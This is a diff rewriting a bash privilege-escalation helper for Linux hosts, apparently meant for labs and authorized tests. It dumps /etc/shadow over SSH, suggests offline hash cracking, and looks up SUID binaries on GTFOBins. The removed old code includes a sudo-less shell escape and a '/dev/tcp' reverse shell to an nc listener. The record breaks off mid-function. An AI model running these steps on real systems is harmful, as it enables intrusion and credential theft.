@@ -1,665 +1,318 @@
-#!/bin/bash
+#!/usr/bin/env bash
+#
+# i_am_root.sh - credentialed Linux privilege-escalation enumeration helper
+#
+# Logs into a host you ALREADY have valid SSH credentials for, runs a standard
+# read-only enumeration pass (users, SUID files, sudo rights, kernel, and the
+# shadow file if permitted), pulls the results back, and cross-references them
+# against searchsploit and GTFOBins.
+#
+# AUTHORIZED USE ONLY: run this against systems you own or are explicitly
+# permitted to test (your own VMs, CTF/lab boxes, in-scope engagements).
+#
+# Requires : bash, ssh   (plus sshpass ONLY if you use password auth)
+# Optional : searchsploit (exploitdb), curl or lynx
+#
+# Authentication: choose password auth (via sshpass) or an SSH private key
+# at runtime. With a key, sudo still needs a password unless the account has
+# NOPASSWD sudo - you'll be prompted for one separately (blank = skip the
+# privileged checks).
+#
+# Why this version is portable: the original drove an interactive SSH session
+# with `expect` plus fixed `sleep` delays and matched exact prompt strings and
+# hardcoded paths, so it only worked on one specific VM. This version runs the
+# whole enumeration as a SINGLE non-interactive command over SSH and captures
+# the output directly, so it works on essentially any Linux host you can log
+# into, regardless of shell, prompt, or home-directory layout.
 
-# ------------------------------------------------------
-# Colors
-# Usage: (echo -e or echo -e) "${COLOR}TEXT HERE${NOCOLOR}"
-# ------------------------------------------------------
-NOCOLOR='\033[0m'
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-ORANGE='\033[0;33m'
-BLUE='\033[0;34m'
-PURPLE='\033[0;35m'
-CYAN='\033[0;36m'
-LIGHTGRAY='\033[0;37m'
-DARKGRAY='\033[1;30m'
-LIGHTRED='\033[1;31m'
-LIGHTGREEN='\033[1;32m'
-YELLOW='\033[1;33m'
-LIGHTBLUE='\033[1;34m'
-LIGHTPURPLE='\033[1;35m'
-LIGHTCYAN='\033[1;36m'
-WHITE='\033[1;37m'
-#-------------------------------------------------------
+set -uo pipefail
+# NOTE: deliberately NOT `set -e`. Individual enumeration steps are allowed to
+# fail (e.g. no sudo rights, no shadow access) without aborting the whole run.
 
-###################################################################################################################
-# Ensure the script is being run as root or with sudo privileges
-if [ "$(id -u)" -ne 0 ]; then
-      echo -e "${RED}
-████████╗██╗░░██╗██╗░██████╗  ░██████╗░█████╗░██████╗░██╗██████╗░████████╗
-╚══██╔══╝██║░░██║██║██╔════╝  ██╔════╝██╔══██╗██╔══██╗██║██╔══██╗╚══██╔══╝
-░░░██║░░░███████║██║╚█████╗░  ╚█████╗░██║░░╚═╝██████╔╝██║██████╔╝░░░██║░░░
-░░░██║░░░██╔══██║██║░╚═══██╗  ░╚═══██╗██║░░██╗██╔══██╗██║██╔═══╝░░░░██║░░░
-░░░██║░░░██║░░██║██║██████╔╝  ██████╔╝╚█████╔╝██║░░██║██║██║░░░░░░░░██║░░░
-░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═════╝░  ╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░░░░░░░╚═╝░░░
+# -------------------------------------------------------------- colors ------
+NOCOLOR=$'\033[0m'; RED=$'\033[0;31m'; GREEN=$'\033[0;32m'; PURPLE=$'\033[0;35m'
 
-      ███╗░░░███╗██╗░░░██╗░██████╗████████╗  ██████╗░███████╗
-      ████╗░████║██║░░░██║██╔════╝╚══██╔══╝  ██╔══██╗██╔════╝
-      ██╔████╔██║██║░░░██║╚█████╗░░░░██║░░░  ██████╦╝█████╗░░
-      ██║╚██╔╝██║██║░░░██║░╚═══██╗░░░██║░░░  ██╔══██╗██╔══╝░░
-      ██║░╚═╝░██║╚██████╔╝██████╔╝░░░██║░░░  ██████╦╝███████╗
-      ╚═╝░░░░░╚═╝░╚═════╝░╚═════╝░░░░╚═╝░░░  ╚═════╝░╚══════╝
+GTFO_FILE=""        # set by gtfobins_scan if any matches are found
+AUTH_METHOD=password # "password" or "key"; set by choose_auth
+SSH_KEY=""          # private key path for key auth (empty = agent/default)
+PASSWD=""           # SSH password (password auth only)
+SUDO_PW=""          # password used for remote sudo -S
+KEYOPT=()           # extra ssh options for the chosen auth method
+CTL=""              # ssh ControlPath socket (reuses one connection)
 
-██████╗░░█████╗░███╗░░██╗  ░█████╗░░██████╗  ██████╗░░█████╗░░█████╗░████████╗
-██╔══██╗██╔══██╗████╗░██║  ██╔══██╗██╔════╝  ██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝
-██████╔╝███████║██╔██╗██║  ███████║╚█████╗░  ██████╔╝██║░░██║██║░░██║░░░██║░░░
-██╔══██╗██╔══██║██║╚████║  ██╔══██║░╚═══██╗  ██╔══██╗██║░░██║██║░░██║░░░██║░░░
-██║░░██║██║░░██║██║░╚███║  ██║░░██║██████╔╝  ██║░░██║╚█████╔╝╚█████╔╝░░░██║░░░
-╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝  ╚═╝░░╚═╝╚═════╝░  ╚═╝░░╚═╝░╚════╝░░╚════╝░░░░╚═╝░░░${NOCOLOR}"
-      exit 1
-fi
-clear
-sleep 1
-###################################################################################################################
-
-function start() {
-
-      MSG1="STARTING PROGRAM....................................[✔]"
-      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG1"  
-      sleep 2
-      echo
-      echo
- ###################################################################################################################
-      #To create a directory for the script.
-      #This command needs to stay in this location
-
-      HOME1=$(pwd)
-      # We check that a working directory exists, if not we create one
-
-      [ ! -d "$HOME1/I_AM_ROOT/" ] && mkdir $HOME1/I_AM_ROOT/ && MSG2="CREATING DIRECTORY..................................[✔]" || MSG3="DIRECTORY ALREADY EXISTS............................[✔]"
-      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG2"
-      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG3"
-
-      sleep 2
-      echo
-      echo
- ###################################################################################################################
-      #Checking for dependencies
-
-      MSG4="CHECKING FOR REQUIRED DEPENDENCIES..................[✔]"
-      MSG5="NON-EXISTENT DEPENDECIES WILL BE INSTALLED..........[✔]"
-
-      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG4"
-      echo
-      echo
-      sleep 2
-      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG5"
-
-      sshpass -v >/dev/null
-            if [ $? -gt 0 ]; then
-            sudo apt-get install sshpass -y
-      fi
-
-      expect -v >/dev/null
-            if [ $? -gt 0 ]; then
-            sudo apt-get install expect -y
-      fi
-
-      xterm -v >/dev/null 
-            if [ $? -gt 0 ]; then
-            sudo apt-get install xterm -y
-      fi
-
-      searchsploit -u &>/dev/null
-            if [ $? -ne 6 ]; then
-            sudo apt-get install exploitdb -y
-      fi
+# typewriter printer:  type_out COLOR "text"
+# (one definition replaces the ~25 copy-pasted read/sleep loops in the original)
+type_out() {
+    local color=$1 text=$2 c
+    while IFS= read -rn1 c; do
+        printf '%s%s%s' "$color" "$c" "$NOCOLOR"
+        sleep 0.02
+    done <<< "$text"
+    echo
 }
 
-#Calling function
-start
-
-sleep 1
-clear
-sleep 2
-###################################################################################################################
-#Banners
-function banners(){
-
- echo -e "${GREEN}                                   wr^^        ^-q__                           ${NOCOLOR}"
- sleep .1                             
- echo -e "${GREEN}                               _dP                 9m_                         ${NOCOLOR}"
- sleep .1
- echo -e "${GREEN}                             _#P                     9#_                       ${NOCOLOR}"
- sleep .1            
- echo -e "${GREEN}                           d#@                       9#m                       ${NOCOLOR}"
- sleep .1 
- echo -e "${GREEN}                          d##                         ###                      ${NOCOLOR}"
- sleep .1 
- echo -e "${GREEN}                        J###                           ###L                    ${NOCOLOR}" 
- sleep .1 
- echo -e "${GREEN}                        {###K                         J###K                    ${NOCOLOR}"
- sleep .1  
- echo -e "${GREEN}                        ]####K        ___aaa___      J####F                    ${NOCOLOR}" 
- sleep .1 
- echo -e "${GREEN}                      __gmM######_  w#P^^   ^^9#m  _d#####Mmw__                ${NOCOLOR}"
- sleep .1  
- echo -e "${GREEN}                   _g##############mZ_         __g##############m_             ${NOCOLOR}"
- sleep .1
- echo -e "${GREEN}                 _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_           ${NOCOLOR}"  
- sleep .1
- echo -e "${GREEN}                a###^^          ,Z######@^ ^######^\g          ^^M##m          ${NOCOLOR}"
- sleep .1
- echo -e "${GREEN}               J#@^             0L  ^*##     ##@^  J#              *#K         ${NOCOLOR}"
- sleep .1
- echo -e "${GREEN}               #^               ##    ~_gmwgm_~    dF               ##_        ${NOCOLOR}"  
- sleep .1
- echo -e "${GREEN}              7F                 ^#_   ]#####F   _dK                 JE        ${NOCOLOR}"  
- sleep .1
- echo -e "${GREEN}              1                    *m__ ##### __g@^                   F        ${NOCOLOR}"  
- sleep .1
- echo -e "${GREEN}                                     ^PJ#####LP^                               ${NOCOLOR}"  
- sleep .1
- echo -e "${GREEN}               ^                       0######_                      ^         ${NOCOLOR}"  
- sleep .1
- echo -e "${GREEN}                                     _0########_                               ${NOCOLOR}"    
- sleep .1
- echo -e "${GREEN}                   .               _d#####^#####m__              ^             ${NOCOLOR}"
- sleep .1
- echo -e "${GREEN}                    ^*w_________am#####P^   ~9#####mw_________w*^              ${NOCOLOR}"
- sleep .1
- echo -e "${GREEN}                        ^^9@#####@M^^           ^^P@#####@M^^                  ${NOCOLOR}"
-
-
-    
-
- echo
- sleep 1
- printf '\e[0;31m%-6s\e[m' "$(tput bold)                                                                               
-      @@@         @@@@@@   @@@@@@@@@@         @@@@@@@    @@@@@@    @@@@@@   @@@@@@@"
- sleep .1
- printf '\e[0;31m%-6s\e[m' "$(tput bold)  
-      @@@        @@@@@@@@  @@@@@@@@@@@        @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@"
- sleep .1
- printf '\e[0;31m%-6s\e[m' "$(tput bold)        
-      @@!        @@!  @@@  @@! @@! @@!        @@!  @@@  @@!  @@@  @@!  @@@    @@!"
- sleep .1
- printf '\e[0;31m%-6s\e[m' "$(tput bold)    
-      !@!        !@!  @!@  !@! !@! !@!        !@!  @!@  !@!  @!@  !@!  @!@    !@!"
- sleep .1
- printf '\e[0;31m%-6s\e[m' "$(tput bold)    
-      !!@        @!@!@!@!  @!! !!@ @!@        @!@!!@!   @!@  !@!  @!@  !@!    @!!"
- sleep .1
- printf '\e[0;31m%-6s\e[m' "$(tput bold)    
-      !!!        !!!@!!!!  !@!   ! !@!        !!@!@!    !@!  !!!  !@!  !!!    !!!"
- sleep .1
- printf '\e[0;31m%-6s\e[m' "$(tput bold)   
-      !!:        !!:  !!!  !!:     !!:        !!: :!!   !!:  !!!  !!:  !!!    !!:"
- sleep .1
- printf '\e[0;31m%-6s\e[m' "$(tput bold)    
-      :!:        :!:  !:!  :!:     :!:        :!:  !:!  :!:  !:!  :!:  !:!    :!:"
- sleep .1
- printf '\e[0;31m%-6s\e[m' "$(tput bold)  
-       ::        ::   :::  :::     ::         ::   :::  ::::: ::  ::::: ::     ::"
- sleep .1
- printf '\e[0;31m%-6s\e[m' "$(tput bold)
-      :           :   : :   :      :           :   : :   : :  :    : :  :      :
-
-
-"
- }
-sleep .5
-#Function banners
-banners
-###################################################################################################################
-#Function to check IP address is in the proper format
-
-function validateIP(){
-
-      IP_ADDRESS="$1"
-      #Check if the format looks right
-      echo -e "$IP_ADDRESS" | grep -E -qE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' || return 1
-      #Check that each octect is less than or equal to 255:
-      echo -e "$IP_ADDRESS" | awk -F'.' '$1 <=255 && $2 <= 255 && $3 <=255 && $4 <= 255 {print "Y" } ' | grep -q Y || return 1
-      return 0
-
-
-      echo 
-      sleep 2
- }
- #Call function
-validateIP
-
- ###################################################################################################################
- #Ask for user input
- function ip_input(){
-      
-      MSG11="ENTER IP ADDRESS: " 
-      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG11"
-      read -r IP_ADDRESS
-
-
-      [ ! -d "$HOME1/I_AM_ROOT/$IP_ADDRESS" ] && mkdir $HOME1/I_AM_ROOT/$IP_ADDRESS
-      DEST=$HOME1/I_AM_ROOT/$IP_ADDRESS/
-
-      sleep 1
-      
-  ###################################################################################################################
-      # While loop to validate the IP provided, if ip is not valid then it will ask for a valid ip
-      while ! validateIP "$IP_ADDRESS"
-            do
-                  echo
-                  MSG12="INVALID IP"
-                  while read -rn1;do echo -ne "${RED}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG12"
-                   sleep .1
-                  echo
-                  echo
-                  MSG13="ENTER A VALID IP: " 
-                  while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG13"
-                  read -r IP_ADDRESS
-            done
-  }
-
-#Call function
-ip_input
-echo
-
- ###################################################################################################################
- #Functions for username & password
-
-function user (){ 
-
-      MSG11="ENTER USERNAME: "
-      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG11"
-      read -r USERNAME
-      echo
-
- }
-
-#Call function
-user
-
-function password(){ 
-
-      MSG12="ENTER PASSWORD: "
-      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG12"
-      read -s PASSWD
-    
- }
-
-#Call function
-password
-###################################################################################################################
-
-sleep 2
-echo
-echo
-
-###################################################################################################################
-#Spin function for show (Need to implement into a process)
-
-
-function progress(){
-      SPINVAR1="PREPARING TO RUN PROGRAM"            
-      spin(){
-            while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$SPINVAR1" 
-            spin1 &
-            pid=$!
-
-
-            for i in $(seq 1 6)
-            do 
-            sleep 1.5
-            done
-
-            kill $pid
-            echo ""
-
-        }
-
-        spin1(){
-            while [ 1 ]
-            do
-            echo -ne " ${GREEN}.${NOCOLOR}"
-            sleep .5 
-            done  
-        }
-        spin
-  }
-
-progress
-echo
-clear
-sleep 2
-###################################################################################################################
-# Variables
-
-DIR=/home/$USERNAME/I_AM_ROOT/
-F=Info.txt
-SND="send \"echo '' >> $DIR${F}\r\""
-
-###################################################################################################################
-# Function with expect commands to ssh into remote host and execute commands. 
-# It will attemp to gather info for possible privilge escalation
-
-MSG13="EXECUTING COMMANDS, NO FURTHER USER INPUT NECESSARY, PLEASE BE PATIENT.........." 
-while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG13"
-echo
-echo
-
-sleep 2
-
-function get_info {
-      expect -c "\
-      set timeout 3 
-      set env(TERM)
-      spawn ssh -t "$USERNAME\@$IP_ADDRESS"
-      send \"\r\"
-      
-      expect_before \"*(yes/no*\" {
-      send \"yes\r\" 
-      send \"$PASSWD\r\"
-      }
-      
-      expect \"*assword*\"
-      send \"$PASSWD\r\"
-      sleep .5 
-      send \"mkdir ${DIR}\r\"
-      sleep .5 
-      send \"touch $DIR${F}\r\"
-      sleep .5
-      send \"echo -e 'I AM ROOTR RESULTS FOR ${IP_ADDRESS}' >> $DIR${F}\r\"
-      ${SND}
-      ${SND}
-      ${SND}
-      sleep .5 
-      send \"echo '@############################## $USERNAME PATH ############################## ' >> $DIR${F}\r\"
-      sleep .5
-      ${SND}
-      sleep .5 
-      send \"echo $PATH >> ${DIR}${F}\r\"
-      sleep .5 
-      ${SND}
-      send \"echo '@##############################  /ETC/PASSWD ############################## ' >> $DIR${F}\r\"
-      ${SND}
-      send \"cat /etc/passwd >> ${DIR}${F}\r\"
-      sleep .5 
-      ${SND}
-      send \"echo '@##############################  /ETC/SHADOW ############################## ' >> $DIR${F}\r\"
-      ${SND}
-      sleep .5 
-      send \"sudo cat /etc/shadow >> $DIR${F}\r\"
-      sleep .5 
-      expect \"*assword*\"
-      send \"$PASSWD\r\"
-      sleep .5 
-      ${SND}
-      ${SND}
-      send \"echo '@##############################  SUID FILES ##############################' >> $DIR${F}\r\"
-      ${SND}
-      send \"find / -perm -u=s -type f >> $DIR${F}\r\"
-      expect \"*assword*\"
-      send \"$PASSWD\r\"
-      ${SND}
-      send \"echo '@##############################  SUDO COMMANDS ############################## ' >> $DIR${F}\r\"
-      ${SND}
-      sleep .5 
-      send \"sudo -l >> ${DIR}${F}\r\"
-      sleep 1
-      expect \"*assword*\"
-      send \"$PASSWD\r\"
-      sleep .5 
-      ${SND}
-      send \"echo '@##############################  KERNEL VERSION ############################## ' >> $DIR${F}\r\"
-      ${SND}
-      send \"uname -r >> ${DIR}${F}\r\"
-      ${SND}
-      sleep .5 
-      send \"exit\r\"
-      "
-  }
-
-#Call function  
-get_info
-
-###################################################################################################################
-echo
-echo
-clear
-sleep 2
-
-MSG14="COMMAND EXECUTION COMPLETE......." 
-while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG14"
-echo
-echo
-sleep .5
-
-###################################################################################################################
-# Commands to transfer the information and delete DIR in remote host.
-
-MSG15="RETRIEVING INFORMATION......."
-while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}";  sleep .07; done<<<"$MSG15"
-echo
-echo
-
-sleep 3 
-sshpass -p "$PASSWD" scp "$USERNAME"@"$IP_ADDRESS":"$DIR"${F} "$DEST"
-sleep 3 
-current_time=$(date "+%Y.%m.%d-%H.%M")
-mv "$DEST"$F "$DEST""$IP_ADDRESS"-"$(date "+%Y.%m.%d-%H.%M")"_.txt
-Info="$DEST""$IP_ADDRESS"-"$(date "+%Y.%m.%d-%H.%M")"_.txt
-
-sshpass -p "$PASSWD" ssh "$USERNAME"@"$IP_ADDRESS" rm -r "$DIR"
-sleep 3
-
-###################################################################################################################
-### Test phase for parsing information to the terminal### (Fisrt test succesful)
-
-# Check for contents in the /ETC/SHADOW section of the file
-
-clear
-
-MSG16="/etc/shadow/..........Found"
-      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .07; done<<<"$MSG16"
-      sleep .5 
-      echo
-      echo
-
-grep '/ETC/SHADOW' -A2 "$Info" | grep 'root'
-#positive result
-if [ $? -eq 0 ]; then
-      printf "
-
-
-      THIS IS YOUR LUCKY DAY!!!
-      THE GOD'S OF ENUMERATION HAVE DEEMED FIT 
-      TO BESTOW THE KEY OF ROOT UPON YOU!!!
-
-      BY USING THE UNSHADOW FEATURE OF JOHN THE RIPPER 
-         ON THE /ETC/PASSWD AND /ETC/SHADOW FILES 
-            YOU NOW PWN THE TARGET MACHINE
-
-
-"
-# negative result
-else
-      printf "
-
-      ENUMERATION DID NOT GRANT YOU A /ETC/SHADOW FILE
-
-"
-fi
-
-echo -e "${PURPLE}###########################################################################${NOCOLOR}"
-echo
-echo
-
-sleep 7 
-###################################################################################################################
-
-MSG17="The user $USERNAME can execute the following commands as sudo"
-      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .1; done<<<"$MSG17"
-      sleep 1
-      echo
-
-# Privilege escalation via sudo less
-
-SUDOBLE=$(grep 'may run the following commands' -A3 "$Info" | sed -n '1!p')
-
-printf '\n\n\n'
-echo "Privilege escalation description:
-        -sudo less into one of the listed files
-        -go to end of file
-        -type '!/bin/sh'
-        -congratulations you are now root user."
-echo
-echo "While ssh'd as User '$USERNAME', The following files will permit privilege escalation:"
-echo "  "$SUDOBLE
-
-sleep 7 
-echo
-echo -e "${PURPLE}###########################################################################${NOCOLOR} 
-
-"
-
-###################################################################################################################
-
-# Kernel Version in searchsploit
-
-MSG18="Checking Kernel Version.........."$KVSE
-      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .07; done<<<"$MSG18"
-      sleep .05 
-      echo
-      echo
-
-KVSE=$(grep 'KERNEL VERSION' -A2 "$Info" | sed -n '1,2!p')
-KVSE=${KVSE:0:4}
-
-echo "
-        THE SEARCHSPLOIT DATABASE HAS THE FOLOWING 
-        VULNERABILITIES LISTED FOR THE KERNEL VER.
-        OF THE TARGET MACHINE:
-
-    "
-searchsploit "LINUX KERNEL " $KVSE
-
-sleep 7
-echo
-echo -e "${PURPLE}###########################################################################${NOCOLOR} 
-
-"
-
-###################################################################################################################
-
-# SUID Files exploit
-
-MSG19="Checking SUID files.........."$KVSE
-      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .07; done<<<"$MSG19"
-      sleep .05 
-      echo
-      echo
-
-sed -n '/SUID/,/@/p' "$Info" | grep -oE '/[^/ ]+$' | grep -Po '^.{1}\K.*' > data.txt
-
-while read line;
-
-do lynx -dump https://gtfobins.github.io/gtfobins/"$line"/ > ro.txt;
-
-wline=$(head -n 1 ro.txt)
-wline=${wline:0:3}
-
-REFI=result"-$(date "+%Y.%m.%d-%H.%M")".txt
-DERPI="$DEST""$REFI"
-touch $DERPI
-
-if [[ $wline -ne "404" ]]; then
-   less ro.txt >> $DERPI
-   echo ' ' >> $DERPI
-   echo ' ' >> $DERPI
-   echo '@##########@' >> $DERPI
-   echo ' ' >> $DERPI
-fi;
-
-done < data.txt
-
-rm ro.txt
-rm data.txt
-
-echo "
-        DEAR USER, INFORMATION ON THE EXPLOITAITION OF
-        ANY AVAILABLE SUID FILES CAN BE FOUND IN A
-        SEPARATE TEXT FILE LOCATED AT:
-    ./I_AM_ROOT/$IP_ADDRESS/$REFI
-     "
-
-sleep 7 
-##################################################################################################################
-
-
-menu_option_one() {
-
-    MSGA="ESTABLISHING CONNECTION FOR PRIVILEGE ESCALATION......."
-    MSGB="PLEASE HAVE SOME PATIENCE AS THE REVERSE SHELL TAKES SOME TIME TO ESTABLISH......."
-      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .07; done<<<"$MSGA"
-      echo
-      echo
-      while read -rn1;do echo -ne "${GREEN}$REPLY${NOCOLOR}"; sleep .07; done<<<"$MSGB"
-    echo
-    echo
-    echo 'What is your ip address?'
-    read -r LOCAL_IP
-    echo
-    echo
-    sleep .5 
-    xterm -geometry 90x30+0+150 -font *-fixed-*-*-*-20-* -e 'nc -nlvp 8080' &
-    sleep 1 
-    expect -c "\
-    set timeout (3)
-    set env(TERM)
-    spawn ssh -t $USERNAME@$IP_ADDRESS
-    sleep 1
-    expect \"*assword*\r\"
-    send \"$PASSWD\r\"
-    sleep .5 
-    send \"sudo less /etc/profile\r\"
-    sleep 1
-    expect \"*assword*\r\"
-    send \"$PASSWD\r\"
-    sleep .5 
-    send \"!/bin/sh\r\"
-    sleep 1
-    send \"bash -i >& /dev/tcp/$LOCAL_IP/8080 0>&1\r\"
-    interact 
-
- "
+divider() { printf '%s%s%s\n' "$PURPLE" "############################################################" "$NOCOLOR"; }
+
+# -------------------------------------------------------------- banner ------
+banner() {
+    printf '%s' "$GREEN"
+    cat <<'ART'
+  ############################################
+  #            I   A M   R O O T             #
+  #   linux privilege-escalation enumeration #
+  ############################################
+ART
+    printf '%s\n' "$NOCOLOR"
+    # (Paste your original ASCII-art banner here if you want the full version.)
 }
 
-menu_option_two() {
-    less $DERPI
+# -------------------------------------------------------- dependencies ------
+require() { command -v "$1" >/dev/null 2>&1; }
+
+check_deps() {
+    if ! require ssh; then
+        type_out "$RED" "Missing required tool: ssh"
+        exit 1
+    fi
+    require searchsploit || type_out "$RED" "searchsploit not found - kernel exploit search will be skipped."
+    if ! require curl && ! require lynx; then
+        type_out "$RED" "Neither curl nor lynx found - GTFOBins lookup will be skipped."
+    fi
 }
 
-menu_option_three() {
-    echo "GOOD BYE"
+# Ask how to authenticate and collect the matching secrets / key path.
+choose_auth() {
+    local m
+    echo
+    echo "  Authentication method:"
+    echo "    1 - Password (via sshpass)"
+    echo "    2 - SSH private key"
+    read -rp "  Select [1/2]: " m
+
+    if [[ $m == 2 ]]; then
+        AUTH_METHOD=key
+        read -rp "  Private key path [blank = ssh-agent / ssh default]: " SSH_KEY
+        if [[ -n $SSH_KEY ]]; then
+            SSH_KEY=${SSH_KEY/#\~/$HOME}            # expand a leading ~
+            [[ -r $SSH_KEY ]] || { type_out "$RED" "Key not readable: $SSH_KEY"; exit 1; }
+            KEYOPT=(-i "$SSH_KEY" -o IdentitiesOnly=yes)
+        fi
+        # Don't let a bad key silently fall back to a password prompt (which
+        # would hang the non-interactive enumeration). A passphrase prompt for
+        # the key itself is still allowed.
+        KEYOPT+=(-o PreferredAuthentications=publickey -o PasswordAuthentication=no)
+        read -rsp "  sudo password (blank to skip privileged checks): " SUDO_PW; echo
+    else
+        AUTH_METHOD=password
+        if ! require sshpass; then
+            type_out "$RED" "Password auth needs sshpass. Install it (sudo apt-get install -y sshpass) or use a key."
+            exit 1
+        fi
+        read -rsp "  SSH password: " PASSWD; echo
+        SUDO_PW=$PASSWD
+    fi
 }
 
+# ----------------------------------------------------------- validation -----
+# Accept either an IPv4 address (octets <= 255) or a plain hostname.
+valid_target() {
+    local t=$1 o
+    if [[ $t =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
+        local IFS=.
+        for o in $t; do ((o <= 255)) || return 1; done
+        return 0
+    fi
+    [[ $t =~ ^[A-Za-z0-9._-]+$ ]]
+}
 
-press_enter() {
-    echo ""
-    echo -n " Press Enter to continue "
-    read
+# ------------------------------------------------------- remote enum --------
+SSHOPTS=(-o StrictHostKeyChecking=accept-new -o ConnectTimeout=10 -T)
+
+# Run ssh with the chosen auth method. Anything in "$@" becomes the remote
+# command; stdin/stdout/redirection are handled by the caller. The first call
+# opens a master connection (ControlMaster) that later calls reuse, so a key
+# passphrase or password is only needed once.
+ssh_run() {
+    if [[ $AUTH_METHOD == password ]]; then
+        sshpass -p "$PASSWD" ssh "${SSHOPTS[@]}" "${KEYOPT[@]}" "$USERNAME@$TARGET" "$@"
+    else
+        ssh "${SSHOPTS[@]}" "${KEYOPT[@]}" "$USERNAME@$TARGET" "$@"
+    fi
+}
+
+# Tear down the shared master connection on exit.
+cleanup() {
+    if [[ -n $CTL && -S $CTL ]]; then
+        ssh "${SSHOPTS[@]}" "${KEYOPT[@]}" -O exit "$USERNAME@$TARGET" 2>/dev/null
+    fi
+    [[ -n $CTL ]] && rm -f "$CTL" 2>/dev/null
+}
+
+test_connection() {
+    type_out "$GREEN" "Testing SSH connection to $USERNAME@$TARGET ..."
+    if ! ssh_run true 2>/dev/null; then
+        type_out "$RED" "Could not SSH to $USERNAME@$TARGET - check the host, credentials/key, and network."
+        exit 1
+    fi
+}
+
+run_enum() {
+    type_out "$GREEN" "Running enumeration (no further input needed, please wait) ..."
+    # The remote script is sent on stdin to `bash -s`. The sudo password is
+    # passed in via an env var, shell-quoted with printf %q so special
+    # characters survive. The heredoc is single-quoted ('REMOTE') so LOCAL
+    # variables are NOT expanded here - only $SUDO_PW, which exists remotely.
+    ssh_run "SUDO_PW=$(printf %q "$SUDO_PW") bash -s" <<'REMOTE' > "$INFO" 2>&1
+set +e
+sec() { printf '\n=== %s ===\n' "$1"; }
+sec HOST;    hostname 2>/dev/null; uname -a; [ -r /etc/os-release ] && cat /etc/os-release
+sec WHOAMI;  id
+sec PATH;    printf '%s\n' "$PATH"
+sec PASSWD;  cat /etc/passwd 2>/dev/null
+sec SUDO;    printf '%s\n' "$SUDO_PW" | sudo -S -l 2>/dev/null || echo "[no sudo rights / wrong password]"
+sec SHADOW;  printf '%s\n' "$SUDO_PW" | sudo -S cat /etc/shadow 2>/dev/null || echo "[no access]"
+sec SUID;    find / -perm -4000 -type f 2>/dev/null
+sec KERNEL;  uname -r
+REMOTE
+    type_out "$GREEN" "Enumeration complete. Raw report: $INFO"
+}
+
+# Print the lines belonging to one "=== NAME ===" section of the report.
+section() {
+    awk -v s="=== $1 ===" '
+        $0 == s          { grab = 1; next }
+        /^=== .* ===$/   { grab = 0 }
+        grab' "$INFO"
+}
+
+# ------------------------------------------------------------ analysis ------
+gtfobins_has() {   # arg: binary name -> 0 if a GTFOBins page exists
+    local b=$1 code
+    if require curl; then
+        code=$(curl -s -o /dev/null -w '%{http_code}' "https://gtfobins.github.io/gtfobins/$b/")
+        [[ $code == 200 ]]
+    elif require lynx; then
+        lynx -dump "https://gtfobins.github.io/gtfobins/$b/" 2>/dev/null | grep -qi "$b"
+    else
+        return 1
+    fi
+}
+
+gtfobins_scan() {
+    if ! require curl && ! require lynx; then
+        type_out "$RED" "GTFOBins lookup skipped (need curl or lynx)."
+        return
+    fi
+    type_out "$GREEN" "Checking SUID binaries against GTFOBins ..."
+    local out="$WORKDIR/gtfobins-$STAMP.txt" found=0 b
+    : > "$out"
+    while IFS= read -r b; do
+        [[ -z $b ]] && continue
+        if gtfobins_has "$b"; then
+            found=1
+            printf '### %-15s https://gtfobins.github.io/gtfobins/%s/\n' "$b" "$b" >> "$out"
+        fi
+    done < <(section SUID | sed 's#.*/##' | sort -u)
+    if ((found)); then
+        type_out "$GREEN" "SUID binaries with known GTFOBins techniques written to: $out"
+        GTFO_FILE="$out"
+    else
+        type_out "$RED" "No SUID binaries matched GTFOBins."
+        rm -f "$out"
+    fi
+}
+
+analyze() {
+    divider
+    # --- /etc/shadow -------------------------------------------------------
+    if section SHADOW | grep -q '^root:[^*!:]'; then
+        type_out "$GREEN" "/etc/shadow is readable and holds a root password hash."
+        echo "  -> Combine it with /etc/passwd:  unshadow passwd shadow > hashes"
+        echo "     then crack offline with John the Ripper or hashcat."
+    else
+        type_out "$RED" "No usable root hash available from /etc/shadow."
+    fi
+    echo
+
+    # --- sudo -l -----------------------------------------------------------
+    local sudo_cmds
+    sudo_cmds=$(section SUDO | sed -n '/may run the following/,$p' | sed '1d')
+    if [[ -n ${sudo_cmds//[[:space:]]/} ]]; then
+        type_out "$GREEN" "User '$USERNAME' may run these commands via sudo:"
+        printf '%s\n' "$sudo_cmds"
